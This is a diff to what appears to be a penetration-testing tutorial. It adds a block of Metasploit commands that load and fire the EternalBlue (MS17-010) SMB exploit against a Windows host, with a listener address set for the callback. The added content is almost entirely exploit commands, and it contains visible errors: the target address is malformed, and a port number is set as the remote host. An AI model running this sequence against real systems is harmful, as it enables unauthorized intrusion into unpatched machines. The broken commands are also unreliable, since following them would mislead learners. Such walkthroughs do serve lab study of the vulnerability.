@@ -60,6 +60,22 @@ msf auxiliary(smb_ms17_010) > exploit
 
 > From the results you will see that the system is vulnerable to the scan
 
+```
+search smb_ms17_010_eternalblue
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+msf exploit(ms17_010_eternalblue) > set rhost 192.168.1.1.128
+
+msf exploit(ms17_010_eternalblue) > set rhost 445
+
+msf exploit(ms17_010_eternalblue) > set lhost 192.168.1.115
+
+msf exploit(ms17_010_eternalblue) > exploit
+```
+
+
+
 
 
 
